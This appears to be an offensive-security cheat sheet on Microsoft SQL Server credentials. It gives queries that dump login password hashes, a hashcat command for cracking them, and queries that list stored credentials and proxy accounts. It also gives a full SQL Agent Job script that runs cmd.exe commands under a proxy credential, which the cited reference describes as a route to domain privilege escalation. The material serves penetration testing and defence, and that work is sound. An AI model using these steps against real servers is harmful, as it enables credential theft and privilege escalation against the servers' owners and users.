# MSSQL - Credentials

## Summary

* [MSSQL Accounts and Hashes](#mssql-accounts-and-hashes)
* [List Credentials on the SQL Server](#list-credentials-on-the-sql-server)
* [Proxy Account Context](#proxy-account-context)


## MSSQL Accounts and Hashes

* MSSQL 2000
    ```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)
    ```

* MSSQL 2005
    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```

Then crack passwords using Hashcat : `hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force`

| Hash-Mode | Hash-Name | Example |
| ---  | --- | --- |
| 131  | MSSQL (2000) | 0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578 |
| 132  | MSSQL (2005) | 0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe |
| 1731 | MSSQL (2012, 2014) | 0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375 |


## List Credentials on the SQL Server

* List credentials configured on the SQL Server instance
    ```sql
    SELECT * FROM sys.credentials 
    ```

* List proxy accounts
    ```sql
    USE msdb; 
    GO 

    SELECT  
        proxy_id, 
        name AS proxy_name, 
        credential_id, 
        enabled 
    FROM  
        dbo.sysproxies; 
    GO 
    ```
    
* [dataplat/dbatools/Get-DecryptedObject.ps1](https://github.com/dataplat/dbatools/blob/7ad0415c2f8a58d3472c1e85ee431c70f1bb8ae4/private/functions/Get-DecryptedObject.ps1)


## Proxy Account Context

Agent Job using the registered proxy credential.

```sql
USE msdb; 
GO 

-- Create the job 
EXEC sp_add_job  
  @job_name = N'WhoAmIJob'; -- Name of the job 

-- Add a job step that uses the proxy to execute the whoami command 
EXEC sp_add_jobstep  
  @job_name = N'WhoAmIJob',  
  @step_name = N'ExecuteWhoAmI',  
  @subsystem = N'CmdExec',          
  @command = N'c:\windows\system32\cmd.exe /c whoami > c:\windows\temp\whoami.txt',           
  @on_success_action = 1,         -- 1 = Quit with success 
  @on_fail_action = 2,                     -- 2 = Quit with failure 
  @proxy_name = N'MyCredentialProxy';     -- The proxy created earlier 

-- Add a schedule to the job (optional, can be manual or scheduled) 
EXEC sp_add_jobschedule  
  @job_name = N'WhoAmIJob',  
  @name = N'RunOnce',  
  @freq_type = 1,             -- 1 = Once 
  @active_start_date = 20240820,       
  @active_start_time = 120000;            

-- Add the job to the SQL Server Agent 
EXEC sp_add_jobserver  
  @job_name = N'WhoAmIJob',  
  @server_name = N'(LOCAL)';  
```

Execute the Agent job so that a process will be started in the context of the proxy account and execute your code/command. 
`EXEC sp_start_job @job_name = N'WhoAmIJob'; `


## References

* [Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation  - Scott Sutherland - September 10, 2024](https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/)


